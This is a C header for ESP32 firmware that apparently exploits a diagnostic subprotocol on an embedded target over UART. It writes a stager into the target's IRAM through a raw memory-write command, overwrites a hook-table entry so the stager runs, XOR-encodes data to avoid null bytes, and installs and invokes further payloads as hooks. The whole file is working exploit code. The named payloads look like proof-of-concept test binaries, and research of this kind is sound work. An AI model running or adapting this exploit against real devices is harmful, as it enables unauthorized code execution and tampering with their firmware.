#ifndef __INSTALL_STAGER_H__
#define __INSTALL_STAGER_H__

#include "../definitions.c"
#include "../utils/utils.c"
#include "commands.c"
#include <stdint.h>
#include <string.h>
#define DEFAULT_STAGER_ADDHOOK_IND 0x20
#define DEFAULT_SECOND_ADD_HOOK_IND 0x1a

#define FIRST_PAYLOAD_LOCATION 0x10010100
#define IRAM_STAGER_START 0x10030100
#define IRAM_STAGER_END 0x100303FC
#define ADD_HOOK_TABLE_START 0x1003ABA0
#define MAX_MSG_LEN 190
#define SEND_REQ_SAFETY_SLEEP_AMT_MS 10
#define IRAM_STAGER_MAX_SIZE (IRAM_STAGER_END - IRAM_STAGER_START)
#define ANSWER_ENTER_SUBPROTO_SUCCESS b"\x80\x00"
#define STAGER_FILE_PATH "/spiffs/stager.bin"
#define PAYLOAD_PATH "/spiffs/hello_world.bin"
#define PAYLOAD_PATH_2 "/spiffs/hello_loop.bin"
static const char *INSTALL_STAGER_TAG = "INSTALL_STAGER";
uint8_t buffer[1024];
size_t bytes_read;

// Static buffers to avoid stack overflow
static uint8_t static_command_buffer[512];
static uint8_t static_encoded_buffer[MAX_MSG_LEN];
static uint8_t static_chunk_buffer[MAX_MSG_LEN - 1];

FILE *stager_file = NULL;
int stager_file_size = 0;

int next_payload_location = FIRST_PAYLOAD_LOCATION;

bool open_stager_file(void) {
    stager_file = fopen(STAGER_FILE_PATH, "rb");
    if (stager_file == NULL) {
        ESP_LOGE("open_stager_file", "Failed to open stager file");
        return false;
    }
    return true;
}

bool check_if_stager_file_is_smaller_than_iram_stager_max_size(void) {
    int file_size = get_spiffs_file_size(STAGER_FILE_PATH);
    stager_file_size = file_size;
    if (file_size > IRAM_STAGER_MAX_SIZE) {
        return false;
    }
    return true;
}

bool validate_stager_hook_index(void) {
    if (DEFAULT_STAGER_ADDHOOK_IND > 0x20) {
        ESP_LOGE("validate_stager_hook_index", "Stager hook index is too large or not in range");
        return false;
    }
    return true;
}

bool load_stager_file_to_memory(void) {
    if (!open_stager_file()) {
        ESP_LOGE("load_stager_file_to_memory", "Failed to open stager file");
        return false;
    }
    stager_file_size = get_spiffs_file_size(STAGER_FILE_PATH);

    // read the stager file into the buffer
    bytes_read = fread(buffer, 1, stager_file_size, stager_file);
    if (bytes_read == 0) {
        ESP_LOGE("load_stager_file_to_memory", "Failed to read stager file");
        return false;
    }
    fclose(stager_file);
    stager_file = NULL;
    return true;
}


bool validate_stager_file_is_in_limits(void) {
    if (0x5000000 <= IRAM_STAGER_START && IRAM_STAGER_START + bytes_read <= 0x10800000) {
        ESP_LOGI("validate_stager_file_is_in_limits", "Stager file is in limits");
        return true;
    }
    ESP_LOGE("validate_stager_file_is_in_limits", "Stager file is not in limits");
    return false;
}

bool enter_subproto_handler(void) {
    ESP_LOGI("enter_subproto_handler", "Entering subproto handler");
    uint8_t response_buffer[10];
    int response_len = 0;
    uint8_t command[3] = {0x80, 0x3B, 0xc2};
    bool result = send_command_hex_and_validate_response(
        command, 3, 3, response_buffer, &response_len, 500, true);
    if (!result) {
        ESP_LOGE("enter_subproto_handler", "Failed to enter subproto handler");
        return false;
    }
    if (response_len != 2 || response_buffer[0] != 0x80 || response_buffer[1] != 0x00) {
        ESP_LOGE("enter_subproto_handler", "Failed to enter subproto handler");
        return false;
    }
    ESP_LOGI("enter_subproto_handler", "Entered subproto handler successfully");
    return true;
}

bool leave_subproto_handler(void) {
    ESP_LOGI("leave_subproto_handler", "Leaving subproto handler");
    uint8_t response_buffer[10];
    int response_len = 0;
    uint8_t command[3] = {0x81, 0xD0, 0x67};
    bool result = send_command_hex_and_validate_response(
        command, 3, 3, response_buffer, &response_len, 500, true);
    if (!result) {
        ESP_LOGE("leave_subproto_handler", "Failed to leave subproto handler");
        return false;
    }
    return true;
}

bool _raw_subproto_write(int target_address ,uint8_t *data, size_t data_len) {
    uint8_t new_packet[UART_BUF_SIZE];
    int new_packet_len = 0;
    uint32_t address = target_address - 0x5000000;

    uint8_t b0 = (address >> 24) & 0xFF; // highest byte
    uint8_t b1 = (address >> 16) & 0xFF;
    uint8_t b2 = (address >> 8)  & 0xFF;
    uint8_t b3 = address & 0xFF;         // lowest byte

    ESP_LOGI("raw_subproto_write", "Writing stager file to IRAM");
    uint8_t *command = static_command_buffer;
    
    // Bounds check
    if (data_len > 512 - 7) {
        ESP_LOGE("raw_subproto_write", "Data length too large for command buffer");
        return false;
    }
    
    command[0] = 0x84;
    command[1] = 0x5A;
    command[2] = 0x2E;
    command[3] = b0;
    command[4] = b1;
    command[5] = b2;
    command[6] = b3;
    for (size_t i = 0; i < data_len; i++) {
        command[7 + i] = 0xff;
    }
    bool result = send_command_hex_and_validate_response(command, 3+4 + data_len, 3, new_packet, &new_packet_len, 500, true);
    if (!result) {
        ESP_LOGE("raw_subproto_write", "_raw_subproto_write - Failed to write stager file to IRAM");
        return false;
    }
    // One write that we cannot perform for dwords is a straight 0x0000 word. We have to do that as a single word for some reason
    if (data_len == 4 && ((data[0] == 0x00 && data[1] == 0x00) || (data[0] == 0x0a && data[1] == 0x00) || 
                         (data[2] == 0x00 && data[3] == 0x00) || (data[2] == 0x0a && data[3] == 0x00))) {
        // Split the write into two word writes
        uint8_t first_word[2] = {data[0], data[1]};
        uint8_t second_word[2] = {data[2], data[3]};
        
        // Write first word
        for (size_t i = 0; i < 2; i++) {
            command[7 + i] = first_word[i];
        }
        result = send_command_hex_and_validate_response(command, 3+4 + 2, 3, new_packet, &new_packet_len, 500, true);
        if (!result) {
            ESP_LOGE("raw_subproto_write", "_raw_subproto_write - Failed to write first word to IRAM");
            return false;
        }
        
        // Write second word at address+2
        uint8_t b0_new = ((address + 2) >> 24) & 0xFF;
        uint8_t b1_new = ((address + 2) >> 16) & 0xFF;
        uint8_t b2_new = ((address + 2) >> 8)  & 0xFF;
        uint8_t b3_new = (address + 2) & 0xFF;
        command[3] = b0_new;
        command[4] = b1_new;
        command[5] = b2_new;
        command[6] = b3_new;
        
        for (size_t i = 0; i < 2; i++) {
            command[7 + i] = second_word[i];
        }
        result = send_command_hex_and_validate_response(command, 3+4 + 2, 3, new_packet, &new_packet_len, 500, true);
        if (!result) {
            ESP_LOGE("raw_subproto_write", "_raw_subproto_write - Failed to write second word to IRAM");
            return false;
        }
    } else {
        // Do the write in one go
        for (size_t i = 0; i < data_len; i++) {
            command[7 + i] = data[i];
        }
        result = send_command_hex_and_validate_response(command, 3+4 + data_len, 3, new_packet, &new_packet_len, 500, true);
        if (!result) {
            ESP_LOGE("raw_subproto_write", "_raw_subproto_write - Failed to write stager file to IRAM");
            return false;
        }
    }
    return true;
}

bool exploit_write_to_iram(int target_address ,uint8_t *data_buffer, size_t data_len) {
    // load_stager_file_to_memory();
    // send 16 bytes chunks of the stager file to the subproto
    printf("Writing %d bytes\n", data_len);
    int skipped_bytes = 0;
    if (data_len % 4 == 2) {
        printf("Writing 2 bytes\n");
        uint8_t data[2];
        // copy 2 bytes from the buffer to the data
        memcpy(data, data_buffer, 2);
        bool result = _raw_subproto_write(target_address, data, 2);
        if (!result) {
            ESP_LOGE("exploit_write_to_iram", "exploit_write_to_iram - Failed to write stager file to IRAM");
            return false;
        }
        target_address += 2;
        skipped_bytes += 2;
    } 
    for (size_t i = skipped_bytes; i < data_len; i += 16) {
        printf("Writing %04x/%04x\n", (unsigned int)i, (unsigned int)data_len);
        size_t remaining = data_len - i;
        size_t chunk_size = (remaining < 16) ? remaining : 16;
        uint8_t data[16];
        memcpy(data, data_buffer + i, chunk_size);
        bool result = _raw_subproto_write(target_address, data, chunk_size);
        if (!result) {
            ESP_LOGE("exploit_write_to_iram", "exploit_write_to_iram - Failed to write stager file to IRAM");
            return false;
        }
        target_address += chunk_size;
    }
    return true;

}

void add_hook_to_iram(void) {
    uint8_t hook_data[6];
    hook_data[0] = 0x00;
    hook_data[1] = 0xff;
    hook_data[2] = (IRAM_STAGER_START >> 24) & 0xFF;
    hook_data[3] = (IRAM_STAGER_START >> 16) & 0xFF;
    hook_data[4] = (IRAM_STAGER_START >> 8) & 0xFF;
    hook_data[5] = (IRAM_STAGER_START) & 0xFF;
    printf("Hook data: ");
    for (size_t i = 0; i < 6; i++) {
        printf("%02X ", hook_data[i]);
    }
    printf("\n");

    exploit_write_to_iram(ADD_HOOK_TABLE_START + 8 * DEFAULT_STAGER_ADDHOOK_IND + 2, hook_data, 6);
}


void invoke_add_hook(int stager_add_hook_ind,uint8_t *data_buffer, size_t data_len ,bool wait_for_response) {
    if (stager_add_hook_ind > 0x20) {
        ESP_LOGE("invoke_add_hook", "Add hook no is too large");
        return;
    }
    uint8_t hook_ind = 0x1c;
    uint8_t command[data_len + 2];
    command[0] = (hook_ind) & 0xFF;
    command[1] = (stager_add_hook_ind) & 0xFF;
    for (size_t i = 0; i < data_len; i++) {
        command[i + 2] = (data_buffer[i]) & 0xFF;
    }
    send_command_hex_and_validate_response(command, data_len + 2, 3, NULL, NULL, 500, true);
}


// Encodes a packet for null-byte free transmission to the stager.
// The encoding is a simple XOR with a key chosen such that the encoded chunk
// contains no null bytes and the key is not equal to the length+2.
// Returns the encoded length in out_len, or -1 on failure.
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>

int encode_packet_for_stager(const uint8_t *chunk,
                             size_t chunk_len,
                             uint8_t *out,
                             size_t out_buf_size,
                             size_t *out_len)
{
    if (!chunk || !out || out_buf_size < chunk_len + 1) {
        return -1;
    }

    // Print like Python's chunk.hex() (contiguous lowercase hex)
    printf("Encoding packet for stager: ");
    for (size_t i = 0; i < chunk_len; i++) {
        printf("%02x", chunk[i]);
    }
    printf("\n");

    // keys 0x01..0xFF inclusive (use int to avoid uint8_t wrap at 0xFF)
    for (int key = 1; key <= 255; key++) {
        if (key == (int)chunk_len + 2) {
            continue;
        }

        // Skip if key byte is present in the chunk
        int in_chunk = 0;
        for (size_t j = 0; j < chunk_len; j++) {
            if (chunk[j] == (uint8_t)key) {
                in_chunk = 1;
                break;
            }
        }
        if (in_chunk) {
            continue;
        }

        // Encode: prefix key, then XOR each byte with key
        out[0] = (uint8_t)key;
        for (size_t j = 0; j < chunk_len; j++) {
            out[j + 1] = chunk[j] ^ (uint8_t)key;
        }

        if (out_len) {
            *out_len = chunk_len + 1;
        }

        printf("Sending chunk with xor key: 0x%02x\n", key);
        return 0;
    }

    // No valid key found (mirrors Python's assert-fail path)
    printf("Could not encode chunk: ");
    for (size_t i = 0; i < chunk_len; i++) {
        printf("%02x", chunk[i]);
    }
    printf("\n");
    return -1;
}









// C version of send_full_msg_via_stager, modeled after the Python version
// Assumes: 
//   - MAX_MSG_LEN is defined (e.g., 192-2)
//   - encode_packet_for_stager is implemented
//   - send_command_hex_and_validate_response is used for sending
//   - sleep_ms is available for sleeping in ms
//   - Logging via ESP_LOGI
//   - Empty ack is a single byte (0x00), error is 0xFF



void send_full_msg_via_stager(uint8_t *msg, size_t msg_len, int chunk_size, int sleep_amt_ms) {
        ESP_LOGI("send_full_msg_via_stager", "Sending full message via stager");
    ESP_LOGI("send_full_msg_via_stager", "Message length: %d", msg_len);
    ESP_LOGI("send_full_msg_via_stager", "Chunk size: %d", chunk_size);
    ESP_LOGI("send_full_msg_via_stager", "Sleep amount: %d", sleep_amt_ms);
    // printf("Message: ");
    // for (size_t i = 0; i < msg_len; i++) {
    //     printf("%02X ", msg[i]);
    // }
    // printf("\n");
    size_t i = 0;
    while (i < msg_len) {
        // Sleep for safety
        vTaskDelay(SEND_REQ_SAFETY_SLEEP_AMT_MS / portTICK_PERIOD_MS);

        size_t chunk_len = (msg_len - i < MAX_MSG_LEN - 1) ? (msg_len - i) : (MAX_MSG_LEN - 1);
        uint8_t *chunk = static_chunk_buffer;
        
        // Bounds check
        if (chunk_len > MAX_MSG_LEN - 1) {
            ESP_LOGE("send_full_msg_via_stager", "Chunk length exceeds buffer size");
            break;
        }
        
        memcpy(chunk, msg + i, chunk_len);

        // Log progress
        ESP_LOGI("send_full_msg_via_stager", "Send progress: 0x%06x/0x%06x (%.2f)", (int)i, (int)msg_len, (float)i/(float)msg_len);

        // Encode the chunk
        uint8_t *encoded = static_encoded_buffer;
        size_t encoded_len = 0;
        if (encode_packet_for_stager(chunk, chunk_len, encoded, MAX_MSG_LEN, &encoded_len) != 0) {
            ESP_LOGE("send_full_msg_via_stager", "Failed to encode chunk for stager");
            break;
        }

        // Send the encoded packet
        uint8_t response[8] = {0};
        int response_len = 0;
        bool ok = send_command_hex_and_validate_response(encoded, encoded_len, 3, response, &response_len, 500, true);

        // // Receive and check ack
        // if (!ok || response_len != 1) {
        //     ESP_LOGE("send_full_msg_via_stager", "Expecting empty ack package (answ of size 1), got len=%d", response_len);
        //     break;
        // }
        // if (response[0] == 0xFF) {
        //     ESP_LOGW("send_full_msg_via_stager", "[WARNING] Interrupting the sending...");
        //     break;
        // }

        i += chunk_len;
    }
    // Send empty packet to signify end of transmission
    uint8_t empty_encoded[1] = {0x01};
    size_t empty_encoded_len = 1;
    bool ok = send_command_hex_and_validate_response(empty_encoded, empty_encoded_len, 3, NULL, NULL, 500, true);
    if (!ok) {
        ESP_LOGE("send_full_msg_via_stager", "Failed to send empty packet to stager");
    }
    
}



void write_via_stager(int target_address,int stager_add_hook_ind,uint8_t *data_buffer, size_t data_len) {
    ESP_LOGI("write_via_stager", "Address: %08X", target_address);
    uint8_t command[4];
    command[0] = (target_address >> 24) & 0xFF;
    command[1] = (target_address >> 16) & 0xFF;
    command[2] = (target_address >> 8) & 0xFF;
    command[3] = (target_address) & 0xFF;
    // ESP_LOGI("write_via_stager", "Invoking add hook");
    invoke_add_hook(stager_add_hook_ind, command, 4, false);
    // ESP_LOGI("write_via_stager", "Sending full message via stager");
    // printf("Data buffer: ");
    // for (size_t i = 0; i < data_len; i++) {
    //     printf("%02X ", data_buffer[i]);
    // }
    // printf("\n");
    send_full_msg_via_stager(data_buffer, data_len, 8, 10);

}


void install_addhook_via_stager(int tar_addr, char *payload_path, int stager_addhook_ind, int add_hook_no) {
    ESP_LOGI("install_addhook_via_stager", "Installing addhook via stager");
    ESP_LOGI("install_addhook_via_stager", "Target address: %08X", tar_addr);
    ESP_LOGI("install_addhook_via_stager", "Payload path: %s", payload_path);
    ESP_LOGI("install_addhook_via_stager", "Stager addhook index: %08X", stager_addhook_ind);
    ESP_LOGI("install_addhook_via_stager", "Add hook no: %08X", add_hook_no);
    int address = ADD_HOOK_TABLE_START + 8 * add_hook_no;
    uint8_t payload[8];
    payload[0] = 0x00;
    payload[1] = 0x00;
    payload[2] = 0x00;
    payload[3] = 0xff;
    payload[4] = (tar_addr >> 24) & 0xFF;
    payload[5] = (tar_addr >> 16) & 0xFF;
    payload[6] = (tar_addr >> 8) & 0xFF;
    payload[7] = tar_addr & 0xFF;
    printf("Payload: ");
    for (size_t i = 0; i < 8; i++) {
        printf("%02X ", payload[i]);
    }
    printf("\n");
    write_via_stager(address, stager_addhook_ind, payload, 8);



    ESP_LOGI("install_addhook_via_stager", "*************************************************************");
    uint8_t payload_buffer[1024];
    size_t payload_size = 0;
    if (!load_spiffs_file_to_memory(payload_path, payload_buffer, 1024, &payload_size)) {
        ESP_LOGE("install_addhook_via_stager", "Failed to load payload file to memory");
        return;
    }
    // printf("Payload size: %d bytes\n", payload_size);
    // for (size_t i = 0; i < payload_size; i++) {
    //     printf("%02X ", payload_buffer[i]);
    // }
    // printf("\n");

    write_via_stager(tar_addr, stager_addhook_ind, payload_buffer, payload_size);


    // If tar_addr == next_payload_location, update next_payload_location to account for payload size and align to 4 bytes
    extern int next_payload_location;
    if (tar_addr == next_payload_location) {
        next_payload_location += payload_size;
        while (next_payload_location % 4 != 0) {
            next_payload_location += 1;
        }
    }


}


void install_stager_to_iram(void) {
    bool result = true;
    ESP_LOGI("install_stager_to_iram", "Installing stager to IRAM");
    if (!check_if_stager_file_is_smaller_than_iram_stager_max_size()) {
        ESP_LOGE("install_stager_to_iram", "Stager file is too large");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Stager file is smaller than IRAM stager max size");
    if (!validate_stager_hook_index()) {
        ESP_LOGE("install_stager_to_iram", "Stager hook index is not in range");
        return;
    }
    result = load_stager_file_to_memory();
    if (!result) {
        ESP_LOGE("install_stager_to_iram", "Failed to load stager file to memory");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Stager file is loaded to memory successfully");
    ESP_LOGI("install_stager_to_iram", "Stager file length: %d", bytes_read);
    ESP_LOGI("install_stager_to_iram", "Stager file contents: %s", buffer);
    ESP_LOGI("install_stager_to_iram", "Entering subproto handler");
    result = enter_subproto_handler();
    if (!result) {
        ESP_LOGE("install_stager_to_iram", "Failed to enter subproto handler");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Entered subproto handler successfully");
    result = exploit_write_to_iram(IRAM_STAGER_START, buffer, bytes_read);
    if (!result) {
        ESP_LOGE("install_stager_to_iram", "Failed to write stager file to IRAM");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Stager file is written to IRAM successfully");
    ESP_LOGI("install_stager_to_iram", "Leaving subproto handler");
    result = leave_subproto_handler();
    if (!result) {
        ESP_LOGE("install_stager_to_iram", "Failed to leave subproto handler");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Left subproto handler successfully");
    ESP_LOGI("install_stager_to_iram", "Entering subproto handler");
    result = enter_subproto_handler();
    if (!result) {
        ESP_LOGE("install_stager_to_iram", "Failed to enter subproto handler");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Entered subproto handler successfully");
    ESP_LOGI("install_stager_to_iram", "Adding hook to IRAM");
    add_hook_to_iram();

    ESP_LOGI("install_stager_to_iram", "Hook is added to IRAM successfully");
    ESP_LOGI("install_stager_to_iram", "Leaving subproto handler");
    result = leave_subproto_handler();
    if (!result) {
        ESP_LOGE("install_stager_to_iram", "Failed to leave subproto handler");
        return;
    }
    ESP_LOGI("install_stager_to_iram", "Left subproto handler successfully");

    install_addhook_via_stager(next_payload_location, PAYLOAD_PATH_2, DEFAULT_STAGER_ADDHOOK_IND, DEFAULT_SECOND_ADD_HOOK_IND);
    invoke_add_hook(DEFAULT_SECOND_ADD_HOOK_IND, NULL, 0, true);

}


#endif // __INSTALL_STAGER_H__